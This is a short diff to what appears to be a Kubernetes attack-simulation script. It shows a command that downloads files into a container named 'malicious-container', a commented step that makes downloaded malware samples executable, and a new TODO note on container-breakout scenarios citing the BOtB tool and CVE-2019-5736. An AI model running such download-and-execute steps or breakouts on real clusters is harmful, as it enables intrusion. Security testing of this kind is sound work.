@@ -27,3 +27,7 @@ microk8s kubectl exec -it malicious-container -- /bin/sh -c "wget https://raw.gi
 #chmod +x $DOWNLOAD_DIR/*_sample
 
 # SENARIO --- LINUX MALWARE 
+
+#TODO - Container Breakout Senaros 
+Container Breakout
+BOtB can perform a container breakout using a known vulnerability such as CVE-2019-5736. It can also escape from privileged containers that have enabled CAPS and SYSCALLS.
